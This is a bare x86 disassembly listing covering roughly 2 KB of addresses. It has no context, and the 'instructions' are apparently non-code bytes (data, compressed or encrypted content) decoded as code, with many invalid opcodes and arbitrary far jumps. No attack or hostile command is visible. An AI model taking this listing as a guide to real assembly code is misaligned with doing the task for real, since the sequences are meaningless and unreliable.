  4090bf:	xor    esp,ebp
  4090c1:	popf   
  4090c2:	arpl   WORD PTR [ebp+0x2f302945],sp
  4090c8:	add    edx,DWORD PTR ds:0x1d3b6570
  4090ce:	dec    ecx
  4090cf:	xchg   edx,eax
  4090d0:	pop    ecx
  4090d1:	jl     0x409123
  4090d3:	mov    ds,esi
  4090d5:	sub    BYTE PTR [esp+ebx*1+0x5224bf53],al
  4090dc:	mov    ds:0xa9227402,al
  4090e1:	pop    ecx
  4090e2:	dec    esi
  4090e3:	(bad)  
  4090e4:	jmp    0x63dc:0xd9f405bd
  4090eb:	jo     0x409133
  4090ed:	add    eax,0xe96e23e1
  4090f2:	mov    esp,0x86350233
  4090f7:	cmp    edi,0xb3d3261f
  4090fd:	and    dh,BYTE PTR [edi]
  4090ff:	je     0x40911c
  409101:	fst    DWORD PTR [edx]
  409103:	ror    BYTE PTR [ebx+ebx*4+0xf758126],0x62
  40910b:	out    dx,al
  40910c:	shl    DWORD PTR [edx+eiz*4-0xae5da8d],0x98
  409114:	jb     0x40912e
  409116:	sbb    al,0x9c
  409118:	mov    esp,0x6b61be00
  40911d:	in     al,dx
  40911e:	fs mov al,0x22
  409121:	in     al,dx
  409122:	ins    BYTE PTR es:[edi],dx
  409123:	adc    al,0x90
  409125:	stos   DWORD PTR es:[edi],eax
  409126:	fwait
  409127:	cli    
  409128:	pop    es
  409129:	dec    esi
  40912a:	aaa    
  40912b:	xchg   DWORD PTR [ebx-0x326ce752],eax
  409131:	test   al,0x6
  409133:	mov    al,ds:0x867b2160
  409138:	idiv   DWORD PTR [edx+0x6b]
  40913b:	scas   eax,DWORD PTR es:[edi]
  40913c:	or     esi,edi
  40913e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913f:	dec    esi
  409140:	cmp    al,0xfb
  409142:	pop    eax
  409143:	sub    dh,BYTE PTR [ecx+0x569027ff]
  409149:	or     DWORD PTR [edx],0xffffffad
  40914c:	(bad)  
  40914d:	and    eax,0xb589fec9
  409152:	sub    eax,0xd793ef70
  409157:	mov    edx,0x8cd90714
  40915c:	or     eax,0x438e4e2f
  409161:	dec    esi
  409162:	data16 xchg BYTE PTR [ecx+edi*1],bl
  409166:	loope  0x409160
  409168:	push   es
  409169:	dec    ebp
  40916a:	inc    ebx
  40916b:	push   0xffffff91
  40916d:	cmp    al,BYTE PTR [ecx]
  40916f:	jae    0x4091c0
  409171:	cli    
  409172:	js     0x4091e2
  409174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409175:	sub    DWORD PTR [esi],esi
  409177:	and    bh,bh
  409179:	or     ebx,DWORD PTR [ebp+ecx*8+0x15406676]
  409180:	add    al,BYTE PTR [ebp-0x26]
  409183:	cld    
  409184:	inc    eax
  409185:	cwde   
  409186:	pushf  
  409187:	xchg   edi,eax
  409188:	pop    es
  409189:	fisttp QWORD PTR [ebp+0x38]
  40918c:	call   DWORD PTR [ecx+0x76]
  40918f:	mov    bh,0x80
  409191:	mov    eax,0x35a76dd7
  409196:	out    0xa3,al
  409198:	adc    DWORD PTR [edi-0x2e023ca6],esi
  40919e:	loope  0x409199
  4091a0:	pop    ecx
  4091a1:	ds jmp 0x409200
  4091a4:	pop    edx
  4091a5:	jmp    0x4c04:0x1d529016
  4091ac:	jb     0x409180
  4091ae:	push   es
  4091af:	xor    eax,ebx
  4091b1:	ds pop esi
  4091b3:	loope  0x4091a3
  4091b5:	(bad)  
  4091b6:	data16 daa 
  4091b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b9:	push   edi
  4091ba:	sbb    eax,0x5c94dce6
  4091bf:	fstp   QWORD PTR [eax-0x4f]
  4091c2:	iret   
  4091c3:	jp     0x409181
  4091c5:	data16 mov cl,0x4b
  4091c8:	nop
  4091c9:	out    dx,eax
  4091ca:	add    ch,BYTE PTR [esi+ebx*2+0x19]
  4091ce:	shl    BYTE PTR [edx+0x73b7b154],1
  4091d4:	retf   0x575a
  4091d7:	lods   al,BYTE PTR ds:[esi]
  4091d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d9:	mov    ebp,0x616a0153
  4091de:	adc    dl,BYTE PTR [ebp-0x564a1ab0]
  4091e4:	in     eax,0x5a
  4091e6:	fld    TBYTE PTR [ebp-0x4]
  4091e9:	ror    DWORD PTR [edi],cl
  4091eb:	cmp    DWORD PTR [ecx+0x1b],ecx
  4091ee:	mov    ds:0x92cd9578,eax
  4091f3:	rcr    DWORD PTR [esi],0x93
  4091f6:	mov    dl,0x81
  4091f8:	shl    edx,1
  4091fa:	mov    al,ds:0x42799dd8
  4091ff:	adc    ah,ch
  409201:	and    bl,0xcd
  409204:	mov    es:0xacd63f5e,al
  40920a:	mov    edx,0x7c9e4152
  40920f:	xchg   ecx,eax
  409210:	xor    eax,0x69206f79
  409215:	js     0x409278
  409217:	(bad)  
  409218:	in     al,0xa
  40921a:	cli    
  40921b:	dec    edx
  40921c:	iret   
  40921d:	jnp    0x40923d
  40921f:	in     eax,0x4b
  409221:	or     DWORD PTR [ecx],ecx
  409223:	jmp    0x900aff34
  409228:	in     eax,dx
  409229:	aaa    
  40922a:	xchg   esi,eax
  40922b:	jle    0x409231
  40922d:	shl    DWORD PTR [ebp+0x73],cl
  409230:	je     0x40927d
  409232:	mov    eax,ds:0x23af75db
  409237:	pusha  
  409238:	mov    al,ds:0xee2d9fe8
  40923d:	popf   
  40923e:	data16 (bad) 
  409240:	cld    
  409241:	sbb    al,0x1a
  409243:	das    
  409244:	jecxz  0x4091eb
  409246:	mov    esp,0x61186573
  40924b:	xlat   BYTE PTR ds:[ebx]
  40924c:	arpl   WORD PTR [ebx-0x1f344918],bx
  409252:	mov    ah,0x8b
  409254:	jae    0x409235
  409256:	adc    eax,0xe75aa43c
  40925b:	pop    ecx
  40925c:	add    ebp,eax
  40925e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40925f:	lock ins DWORD PTR es:[edi],dx
  409261:	js     0x40928a
  409263:	sub    eax,0xf7bee289
  409268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409269:	lock mov eax,ds:0x99adc738
  40926f:	mov    eax,DWORD PTR [edx]
  409271:	std    
  409272:	stc    
  409273:	nop
  409274:	and    esp,DWORD PTR [ebp-0x28c657d0]
  40927a:	sbb    esi,esi
  40927c:	scas   al,BYTE PTR es:[edi]
  40927d:	push   0xd9de880d
  409282:	fcmovnbe st,st(4)
  409284:	adc    DWORD PTR [edx],ebx
  409286:	clc    
  409287:	add    bh,dh
  409289:	popa   
  40928a:	loop   0x4092af
  40928c:	je     0x4092cd
  40928e:	adc    cl,BYTE PTR [ebp-0x72]
  409291:	pusha  
  409292:	ret    
  409293:	fcomp  QWORD PTR [esi+0x2d]
  409296:	push   cs
  409297:	push   eax
  409298:	jae    0x409283
  40929a:	sub    ch,ch
  40929c:	in     eax,0x77
  40929e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40929f:	btr    DWORD PTR [eax+0x45ffc055],esi
  4092a6:	inc    esp
  4092a7:	push   ds
  4092a8:	jle    0x409238
  4092aa:	jb     0x40922f
  4092ac:	in     al,dx
  4092ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ae:	mov    dl,0x3b
  4092b0:	sub    ah,0x8b
  4092b3:	sub    BYTE PTR [edx+0x36fe0fa5],cl
  4092b9:	fild   DWORD PTR [ebx]
  4092bb:	mov    bl,0xe8
  4092bd:	adc    ah,BYTE PTR [edi+0x51]
  4092c0:	jle    0x409247
  4092c2:	enter  0xce26,0x6d
  4092c6:	mov    ch,0x65
  4092c8:	loop   0x409282
  4092ca:	mov    ah,0x8d
  4092cc:	mov    dh,0x92
  4092ce:	xlat   BYTE PTR ds:[ebx]
  4092cf:	or     eax,0x8030602f
  4092d4:	inc    esp
  4092d5:	mov    ds:0x6aa23787,al
  4092da:	dec    ecx
  4092db:	pop    ss
  4092dc:	mov    bl,0x34
  4092de:	mov    esp,0xb482fa1b
  4092e3:	sar    BYTE PTR [edx+edi*4+0x62d5cb19],0x76
  4092eb:	mov    ds:0x43ce8981,eax
  4092f0:	add    cl,BYTE PTR [esi-0x107e732c]
  4092f6:	fistp  WORD PTR [ebx+0x13]
  4092f9:	sub    BYTE PTR [edi+0x216d081f],0xe1
  409300:	jae    0x4092cb
  409302:	popf   
  409303:	and    eax,0x1c09f988
  409308:	cs inc ecx
  40930a:	rcl    BYTE PTR [edx+esi*1+0x65],cl
  40930e:	adc    esi,DWORD PTR ds:0x7843fd70
  409314:	pop    edi
  409315:	mov    ebx,0x6759cd79
  40931a:	test   BYTE PTR [esi-0x5cb8aad8],bl
  409320:	sub    bl,BYTE PTR [ebx]
  409322:	scas   eax,DWORD PTR es:[edi]
  409323:	jp     0x409344
  409325:	lock cli 
  409327:	cs xchg ebx,eax
  409329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40932a:	test   al,0x96
  40932c:	xchg   ebx,eax
  40932d:	sbb    BYTE PTR [ecx+edi*1],cl
  409330:	sub    eax,0xbcaccd3e
  409335:	sub    ecx,DWORD PTR [ecx]
  409337:	shl    ebp,cl
  409339:	push   ebx
  40933a:	retf   0x326e
  40933d:	(bad)  
  40933e:	enter  0x43b0,0x42
  409342:	shl    DWORD PTR [edi+0x1d],cl
  409345:	(bad)  
  409346:	fcmovnb st,st(2)
  409348:	(bad)  
  409349:	jg     0x40939b
  40934b:	arpl   WORD PTR [ebx-0x56],ax
  40934e:	xchg   edi,eax
  40934f:	loope  0x4093c8
  409351:	sbb    DWORD PTR [eax],edx
  409353:	pop    edx
  409354:	outs   dx,BYTE PTR ds:[esi]
  409355:	mov    ebx,0xe72a1df0
  40935a:	gs loope 0x409326
  40935d:	scas   al,BYTE PTR es:[edi]
  40935e:	std    
  40935f:	mov    ds:0x8d7a3712,al
  409364:	push   ss
  409365:	loop   0x4093aa
  409367:	retf   
  409368:	sbb    eax,0x5038d48a
  40936d:	cld    
  40936e:	arpl   WORD PTR [edx+0x603f0f9b],di
  409374:	mov    ah,0x10
  409376:	test   al,0xd5
  409378:	xlat   BYTE PTR ds:[ebx]
  409379:	cmp    al,0x12
  40937b:	retf   0x4408
  40937e:	fldenv [ebx]
  409380:	fldenv [eax]
  409382:	jp     0x409336
  409384:	adc    bh,BYTE PTR [edx]
  409386:	mov    esp,0x7bbb5623
  40938b:	mov    esp,0xd54b871b
  409390:	and    eax,0x62cfd50b
  409395:	(bad)  
  409397:	call   DWORD PTR [eax]
  409399:	mov    dl,0x5c
  40939b:	and    ch,dl
  40939d:	add    al,0x3e
  40939f:	lahf   
  4093a0:	push   0xffffffe1
  4093a2:	cld    
  4093a3:	adc    eax,0x392aa6d
  4093a8:	jmp    0x409413
  4093aa:	mov    al,0xfb
  4093ac:	cs jecxz 0x40940f
  4093af:	outs   dx,BYTE PTR ds:[esi]
  4093b0:	mov    ch,0x73
  4093b2:	sub    esi,DWORD PTR [ecx+edi*1-0x559132e4]
  4093b9:	pop    ss
  4093ba:	jne    0x409347
  4093bc:	imul   ebp,esp,0x196bc5d5
  4093c2:	rcl    DWORD PTR [edx-0x39c09c9e],1
  4093c8:	jmp    0x409449
  4093ca:	cmp    BYTE PTR [ebp-0x13],ah
  4093cd:	sub    BYTE PTR [edi],0x77
  4093d0:	xor    DWORD PTR [bx],esi
  4093d3:	push   ecx
  4093d4:	xor    BYTE PTR [ebx],ch
  4093d6:	out    dx,eax
  4093d7:	and    esp,DWORD PTR [esi+0x9]
  4093da:	rcl    BYTE PTR [ecx],0x46
  4093dd:	mov    dl,0x8b
  4093df:	popf   
  4093e0:	cld    
  4093e1:	in     eax,0x7f
  4093e3:	sbb    DWORD PTR [ecx+0x30760906],edi
  4093e9:	pop    esi
  4093ea:	les    ecx,FWORD PTR [ecx+0x30]
  4093ed:	dec    ebp
  4093ee:	addr16 jmp 0x409435
  4093f1:	mov    ah,0xd9
  4093f3:	jge    0x409436
  4093f5:	call   0xe096ba3
  4093fa:	xchg   edx,eax
  4093fb:	pop    edx
  4093fc:	or     eax,0xabc61ab5
  409401:	call   0xe2e1b06c
  409406:	lods   eax,DWORD PTR ds:[esi]
  409407:	imul   esi,DWORD PTR [edi+0x47dfcd6e],0xfffffffc
  40940e:	into   
  40940f:	sbb    ebp,ebx
  409411:	pop    ds
  409412:	sub    al,0xd3
  409414:	punpckhwd mm1,QWORD PTR ds:0x7a02e377
  40941b:	or     ch,BYTE PTR [eax-0x6ece3a92]
  409421:	and    al,0x6d
  409423:	sahf   
  409424:	adc    DWORD PTR [eax],eax
  409426:	inc    ebx
  409427:	dec    esp
  409428:	or     ch,cl
  40942a:	or     ch,ch
  40942c:	(bad)  
  40942d:	std    
  40942e:	pop    es
  40942f:	mov    eax,ds:0x2871e7c1
  409434:	test   BYTE PTR [edi+0x103e3b8],ch
  40943a:	mov    edx,0x23082ac6
  40943f:	pop    eax
  409440:	aas    
  409441:	mov    bl,0x25
  409443:	or     cl,BYTE PTR [eax+esi*2]
  409446:	xchg   ecx,eax
  409447:	inc    edi
  409448:	lds    esi,FWORD PTR [edx-0x60a274a5]
  40944e:	ret    0xcc62
  409451:	sbb    ebp,ebp
  409453:	sbb    al,0xfb
  409455:	push   esi
  409456:	mov    ch,BYTE PTR [edx-0x4d]
  409459:	push   ds
  40945a:	inc    ebp
  40945b:	mov    dl,BYTE PTR [edi+0x50]
  40945e:	inc    esi
  40945f:	cmp    bl,BYTE PTR [ebx*4-0xbee1488]
  409466:	and    eax,0x514950b
  40946b:	loopne 0x4094bb
  40946d:	cmp    eax,0x5b54e28d
  409472:	bound  edi,QWORD PTR ds:0xa54a8523
  409478:	pop    edx
  409479:	xchg   ebx,eax
  40947a:	or     al,0xb8
  40947c:	(bad)  
  40947d:	jne    0x409437
  40947f:	inc    esi
  409480:	pop    ds
  409481:	arpl   WORD PTR [eax-0x4639362a],dx
  409487:	mov    ebx,0x272b672f
  40948c:	cdq    
  40948d:	add    al,BYTE PTR [ebp+0x18f12f96]
  409493:	pop    ss
  409494:	ja     0x409443
  409496:	xchg   esi,eax
  409497:	loop   0x409514
  409499:	arpl   di,di
  40949b:	push   ds
  40949c:	bound  esi,QWORD PTR [esi]
  40949e:	jno    0x4094fe
  4094a0:	adc    al,0x3c
  4094a2:	xor    dh,BYTE PTR ss:[ecx+0x26]
  4094a6:	mov    ds:0x91d1df4a,eax
  4094ab:	push   ecx
  4094ac:	nop
  4094ad:	ja     0x4094b7
  4094af:	sbb    DWORD PTR [ecx+0x1957d14e],esi
  4094b5:	push   0x4f
  4094b7:	inc    edx
  4094b8:	mov    DWORD PTR [ebp-0x75],edx
  4094bb:	fldcw  WORD PTR [ecx+0x4411b012]
  4094c1:	gs jmp 0x6eff:0xe8d78d83
  4094c9:	aas    
  4094ca:	pop    ds
  4094cb:	int    0xc2
  4094cd:	cwde   
  4094ce:	ffree  st(1)
  4094d0:	pop    ds
  4094d1:	or     BYTE PTR [ebx],ch
  4094d3:	(bad)  
  4094d4:	xchg   esi,eax
  4094d5:	hlt    
  4094d6:	mov    DWORD PTR [edi-0x68],edx
  4094d9:	mov    gs,WORD PTR [edi+0x23970281]
  4094df:	xchg   edx,esp
  4094e1:	jo     0x4094aa
  4094e3:	in     eax,0xef
  4094e5:	loope  0x40954a
  4094e7:	and    eax,0xce5c8057
  4094ec:	xor    BYTE PTR ds:0x612a0f86,ch
  4094f2:	jg     0x4094cf
  4094f4:	mov    dl,0x2
  4094f6:	sub    ah,bh
  4094f8:	mov    BYTE PTR [ecx],ah
  4094fa:	adc    al,0x3e
  4094fc:	arpl   di,sp
  4094fe:	imul   eax,DWORD PTR [eax-0x14],0x20
  409502:	test   al,0xc2
  409504:	pop    ss
  409505:	in     al,dx
  409506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409507:	icebp  
  409508:	stos   DWORD PTR es:[edi],eax
  409509:	aam    0xa5
  40950b:	data16 xor BYTE PTR [bx+di-0x44fb],ch
  409511:	lahf   
  409512:	enter  0xfb04,0x3c
  409516:	mov    al,ds:0x453a4ae3
  40951b:	add    edi,ebx
  40951d:	jbe    0x4094be
  40951f:	mov    ecx,0xaea9a0c2
  409524:	xor    eax,0x77eb32de
  409529:	sbb    edx,DWORD PTR [ebx-0x27f0751f]
  40952f:	cmp    BYTE PTR [edi+edi*2+0x1fde74ee],bh
  409536:	daa    
  409537:	push   ds
  409538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409539:	in     eax,dx
  40953a:	jle    0x409534
  40953c:	add    ebp,edx
  40953e:	xchg   ebp,eax
  40953f:	mov    bl,0x47
  409541:	mov    WORD PTR [esi+0x4e],?
  409544:	fild   WORD PTR [ebx-0x78]
  409547:	lods   eax,DWORD PTR ds:[esi]
  409548:	shr    cl,cl
  40954a:	(bad)  [ecx+0x3f]
  40954d:	sbb    DWORD PTR [ebx+ebp*4-0x4648a6dd],eax
  409554:	add    BYTE PTR ds:0xfa5e277,bl
  40955a:	mov    BYTE PTR [esi],cl
  40955c:	mov    cl,BYTE PTR [ebx-0x1139e979]
  409562:	pop    esp
  409563:	dec    edi
  409564:	cld    
  409565:	push   eax
  409566:	jmp    0x2a98ab06
  40956b:	push   eax
  40956c:	cmp    BYTE PTR [edx-0x10d7fbfb],cl
  409572:	jge    0x4095a0
  409574:	out    0xf0,eax
  409576:	inc    esi
  409577:	js     0x40959f
  409579:	push   edi
  40957a:	ret    
  40957b:	mov    ebx,0x854cdb7
  409580:	inc    edi
  409581:	jp     0x40959d
  409583:	adc    BYTE PTR [edx],bh
  409585:	cmp    eax,0xf4031e03
  40958a:	out    dx,eax
  40958b:	fcmovb st,st(0)
  40958d:	add    DWORD PTR [ebp+0x35],ebp
  409590:	cmp    DWORD PTR [ecx],ebp
  409592:	ficom  DWORD PTR [eax-0x3545b07a]
  409598:	xchg   esi,eax
  409599:	dec    edi
  40959a:	(bad)  
  40959b:	in     eax,0xa4
  40959d:	jmp    0x9a30:0xe722cfa6
  4095a4:	aad    0x9b
  4095a6:	xchg   esi,eax
  4095a7:	fsubp  st(5),st
  4095a9:	sti    
  4095aa:	mov    ch,0xd1
  4095ac:	sub    eax,0x8edd5b6d
  4095b1:	mov    ch,bl
  4095b3:	mov    gs,WORD PTR [ebp-0x47]
  4095b6:	jp     0x409553
  4095b8:	pop    es
  4095b9:	rol    BYTE PTR [ecx-0x62ac1a65],0x83
  4095c0:	push   ebx
  4095c1:	add    DWORD PTR [eax],0xffffffb6
  4095c4:	mov    ecx,0xece2785
  4095c9:	fisubr DWORD PTR [ebp+0x3e]
  4095cc:	and    eax,0xbf7164e
  4095d1:	inc    ebp
  4095d2:	sbb    eax,0xc66d7939
  4095d7:	jo     0x40956b
  4095d9:	add    bh,dh
  4095db:	jns    0x4095ac
  4095dd:	sub    dh,al
  4095df:	fdivr  st,st(7)
  4095e1:	lahf   
  4095e2:	ins    BYTE PTR es:[edi],dx
  4095e3:	sub    ecx,eax
  4095e5:	mov    ds:0xff7913c3,al
  4095ea:	inc    edi
  4095eb:	mov    dl,0x9
  4095ed:	lds    ebp,FWORD PTR [ebp+0x1025ae5f]
  4095f3:	popf   
  4095f4:	call   0x2146cd2e
  4095f9:	iret   
  4095fa:	jl     0x4095cc
  4095fc:	xchg   BYTE PTR [esp+eiz*4],dl
  4095ff:	dec    ebp
  409600:	mov    bh,0x50
  409602:	dec    edi
  409603:	xor    al,BYTE PTR [ecx]
  409605:	jne    0x409602
  409607:	and    eax,0x40288a85
  40960c:	xor    BYTE PTR [ebp-0x6a],0xe0
  409610:	push   ss
  409611:	les    ebp,FWORD PTR [edx+eiz*1]
  409614:	jp     0x4095b5
  409616:	(bad)  
  409618:	shr    BYTE PTR [edi-0x2b],cl
  40961b:	bound  ecx,QWORD PTR [edx+0x55]
  40961e:	xchg   ebp,eax
  40961f:	cmp    al,BYTE PTR [edi]
  409621:	inc    edi
  409622:	push   eax
  409623:	pusha  
  409624:	fnstenv ds:0x16f4690b
  40962a:	loopne 0x4095e1
  40962c:	call   0x36b1:0xcf47d855
  409633:	mov    eax,0x903b94f6
  409638:	mov    dl,0x53
  40963a:	das    
  40963b:	mov    gs,WORD PTR [edi+0x66]
  40963e:	mov    esi,0x57c36cef
  409643:	or     ah,BYTE PTR [ebx+ecx*4+0x7c]
  409647:	shl    DWORD PTR [ebp+0x3b],1
  40964a:	xchg   edi,eax
  40964b:	lods   al,BYTE PTR ds:[esi]
  40964c:	mov    dl,cl
  40964e:	pop    esi
  40964f:	ror    BYTE PTR [edx+esi*4],1
  409652:	adc    DWORD PTR [edx],eax
  409654:	adc    esi,DWORD PTR [edx-0x62]
  409657:	inc    eax
  409658:	xchg   ebp,ebx
  40965a:	jge    0x4095ea
  40965c:	or     DWORD PTR [ebp+0x670478cd],edi
  409662:	adc    cl,BYTE PTR [ebx-0x44]
  409665:	xor    DWORD PTR [ebp+0x5b9e636d],eax
  40966b:	in     eax,0x7b
  40966d:	xchg   edx,eax
  40966e:	cld    
  40966f:	pop    esp
  409670:	pop    ss
  409671:	mov    ch,0x37
  409673:	cmp    BYTE PTR [ebx],bl
  409675:	inc    esi
  409676:	cs lahf 
  409678:	jmp    esi
  40967a:	add    BYTE PTR [edx+esi*8+0x4daf33cc],ch
  409681:	xchg   esi,eax
  409682:	pop    ebp
  409683:	xlat   BYTE PTR ds:[ebx]
  409684:	or     ecx,ebp
  409686:	pop    eax
  409687:	(bad)  
  409688:	cmp    al,0x24
  40968a:	iret   
  40968b:	jo     0x40968a
  40968d:	into   
  40968e:	scas   eax,DWORD PTR es:[edi]
  40968f:	push   0x1774b047
  409694:	enter  0x28a8,0xa9
  409698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409699:	fdivr  DWORD PTR [edx-0x247b0102]
  40969f:	in     al,0xec
  4096a1:	pop    ebp
  4096a2:	pop    ss
  4096a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a4:	lds    edi,FWORD PTR [ecx]
  4096a6:	and    bl,cl
  4096a8:	pop    esi
  4096a9:	jbe    0x409690
  4096ab:	aas    
  4096ac:	push   edx
  4096ad:	mov    ch,0x93
  4096af:	shr    DWORD PTR [ebx+ebx*2+0x62a8c623],cl
  4096b6:	ss stos BYTE PTR es:[edi],al
  4096b8:	add    DWORD PTR [eax+0xe],ebx
  4096bb:	rcl    DWORD PTR [ebp+ecx*4-0x569b61c2],cl
  4096c2:	and    edx,DWORD PTR [eax+0x1c9cd244]
  4096c8:	jo     0x4096d6
  4096ca:	sub    ebp,DWORD PTR [edx-0x7c497e86]
  4096d0:	xor    bl,bl
  4096d2:	jno    0x409739
  4096d4:	add    DWORD PTR [edi+0x5a50734c],esp
  4096da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096db:	rcr    DWORD PTR [esi+0x60],1
  4096de:	sti    
  4096df:	jne    0x4096df
  4096e1:	out    0x6c,eax
  4096e3:	sub    DWORD PTR [eax+0xf],eax
  4096e6:	or     ebp,edx
  4096e8:	retf   
  4096e9:	(bad)  
  4096ea:	(bad)  
  4096eb:	cs push edx
  4096ed:	loope  0x409726
  4096ef:	pop    esi
  4096f0:	in     eax,dx
  4096f1:	les    ebp,FWORD PTR [edx+0x702013ba]
  4096f7:	xlat   BYTE PTR ds:[ebx]
  4096f8:	and    al,0x39
  4096fa:	dec    eax
  4096fb:	(bad)  
  4096fc:	in     eax,dx
  4096fd:	push   ds
  4096fe:	inc    ecx
  4096ff:	into   
  409700:	out    0x45,al
  409702:	or     al,0x8a
  409704:	call   DWORD PTR [ebp-0x3]
  409707:	add    DWORD PTR [edx],ecx
  409709:	push   esp
  40970a:	xchg   edi,ecx
  40970c:	sub    bh,BYTE PTR [esp+ecx*8+0x8b1d927]
  409713:	sub    esp,DWORD PTR [ebp+0x6f95e353]
  409719:	push   ebx
  40971a:	vpaddb xmm2,xmm3,XMMWORD PTR [eax]
  40971e:	(bad)  
  40971f:	dec    ebp
  409720:	mov    al,ds:0x6efc6716
  409725:	pop    es
  409726:	mov    esi,0x1a657ed5
  40972b:	and    bl,BYTE PTR [ebx]
  40972d:	sbb    DWORD PTR [ebp+eax*1+0x60e0a260],ebx
  409734:	loope  0x40975a
  409736:	daa    
  409737:	imul   ebx,DWORD PTR [ecx],0x269bd923
  40973d:	(bad)  
  40973e:	out    dx,eax
  40973f:	push   0x546efe74
  409744:	or     eax,0xf24d514b
  409749:	popa   
  40974a:	dec    edx
  40974b:	dec    ebx
  40974c:	jns    0x409724
  40974e:	xchg   DWORD PTR ds:[ecx+0x5d3db960],edx
  409755:	xor    dl,BYTE PTR [ecx]
  409757:	adc    eax,0xcf5fd4ab
  40975c:	mov    ds:0x4e45915d,eax
  409761:	and    al,0xd9
  409763:	int3   
  409764:	repz cmp dl,BYTE PTR [edi-0x5d40e29a]
  40976b:	ds and al,0x4a
  40976e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976f:	mov    ds:0x6e17a4f3,al
  409774:	push   0x344ffdbb
  409779:	inc    eax
  40977a:	mov    al,0x34
  40977c:	mov    WORD PTR [ecx],fs
  40977e:	rcr    BYTE PTR [ecx+0x4],cl
  409781:	inc    eax
  409782:	out    0x4f,eax
  409784:	and    ch,BYTE PTR [esi-0x6e]
  409787:	ins    BYTE PTR es:[edi],dx
  409788:	sbb    BYTE PTR [edx],0x5f
  40978b:	xchg   ebp,ecx
  40978d:	dec    esi
  40978e:	popf   
  40978f:	test   DWORD PTR [edx+ebp*4-0x4b],esi
  409793:	sub    ebx,DWORD PTR [ecx-0x5b]
  409796:	xchg   esi,eax
  409797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409798:	in     eax,dx
  409799:	aas    
  40979a:	sbb    al,0x56
  40979c:	sbb    BYTE PTR [edi],cl
  40979e:	mov    esi,0x43799faa
  4097a3:	push   ss
  4097a4:	lahf   
  4097a5:	das    
  4097a6:	pop    eax
  4097a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a8:	cdq    
  4097a9:	fisubr WORD PTR [eax+0x344939b1]
  4097af:	sub    dh,al
  4097b1:	sar    DWORD PTR [edi-0x5f41253f],1
  4097b7:	or     al,0x7
  4097b9:	mov    ecx,edi
  4097bb:	retf   
  4097bc:	push   edi
  4097bd:	rcl    BYTE PTR [ecx+0x5f],1
  4097c0:	adc    ecx,ebp
  4097c2:	(bad)  
  4097c3:	scas   eax,DWORD PTR es:[edi]
  4097c4:	jnp    0x409796
  4097c6:	shl    bl,0x56
  4097c9:	out    0xc5,al
  4097cb:	push   0xc22e247e
  4097d0:	jbe    0x4097e2
  4097d2:	ds jecxz 0x409783
  4097d5:	daa    
  4097d6:	fyl2x  
  4097d8:	or     DWORD PTR [esi],eax
  4097da:	je     0x4097b6
  4097dc:	push   es
  4097dd:	and    BYTE PTR [eax-0x24048828],bh
  4097e3:	int3   
  4097e4:	ret    0x6512
  4097e7:	int    0x6e
  4097e9:	xchg   ebx,eax
  4097ea:	scas   eax,DWORD PTR es:[edi]
  4097eb:	lods   al,BYTE PTR ds:[esi]
  4097ec:	sahf   
  4097ed:	lock and eax,0x68777213
  4097f3:	sub    dh,BYTE PTR [esi]
  4097f5:	retfw  0x38b7
  4097f9:	sub    BYTE PTR [eax+0x2a799fe0],0x63
  409800:	std    
  409801:	and    BYTE PTR [eax],0xae
  409804:	cmp    BYTE PTR [eax+eax*8+0x73398663],0x50
  40980c:	loopne 0x409792
  40980e:	test   esp,edx
  409810:	xor    DWORD PTR [eax+0x57],esi
  409813:	adc    al,0x7e
  409815:	hlt    
  409816:	jae    0x4097e3
  409818:	fwait
  409819:	xchg   ecx,eax
  40981a:	(bad)  
  40981b:	jmp    0x2250:0x870b80af
  409822:	adc    DWORD PTR [ecx+ecx*8+0x73],0x5cd3c663
  40982a:	add    bl,BYTE PTR [ebp+eax*4-0xa213270]
  409831:	aas    
  409832:	sub    dh,BYTE PTR [ebp+ebx*8-0x4b]
  409836:	adc    eax,0x7f9b5dca
  40983b:	mov    WORD PTR [edx-0x65],fs
  40983e:	adc    esp,DWORD PTR [edx+0x66b1384a]
  409844:	scas   al,BYTE PTR es:[edi]
  409845:	shr    BYTE PTR [ebp+0x35],0xfe
  409849:	jmp    0xfb0f:0x51c7a6b4
  409850:	shr    ebp,0xcc
  409853:	popa   
  409854:	xor    eax,eax
  409856:	and    bh,BYTE PTR ds:[ecx+0x42d39b73]
  40985d:	repz xchg edx,eax
  40985f:	lock fcmovu st,st(0)
  409862:	push   edi
  409863:	aas    
  409864:	jl     0x4098d4
  409866:	setl   BYTE PTR ds:0xa4718689
  40986d:	gs popf 
  40986f:	dec    edi
  409870:	pop    esp
  409871:	or     DWORD PTR [esi-0x5d],ebx
  409874:	mov    ecx,DWORD PTR [eax+0x5b]
  409877:	add    bl,BYTE PTR [ecx-0xfa31688]
  40987d:	jge    0x4098e9
  40987f:	sbb    esp,ecx
  409881:	mov    ds,WORD PTR [ecx]
  409883:	dec    ebp
  409884:	xor    esp,DWORD PTR [esi]
  409886:	push   0xc29219ab
  40988b:	popf   
  40988c:	fcom   QWORD PTR [edx-0x5973db78]
  409892:	ret    
  409893:	ins    BYTE PTR es:[edi],dx
  409894:	xor    eax,0x5a2b118f
  409899:	xchg   edi,eax
  40989a:	sahf   
  40989b:	pop    ds
  40989c:	pop    eax
  40989d:	sbb    eax,0xf3faf9c2
  4098a2:	add    al,0xa9
  4098a4:	icebp  
  4098a5:	outs   dx,BYTE PTR ds:[esi]
  4098a6:	pop    ecx
  4098a7:	fldenv [esi+eax*2+0x38de30f1]
  4098ae:	cld    
  4098af:	add    DWORD PTR [esp+ecx*1],ecx
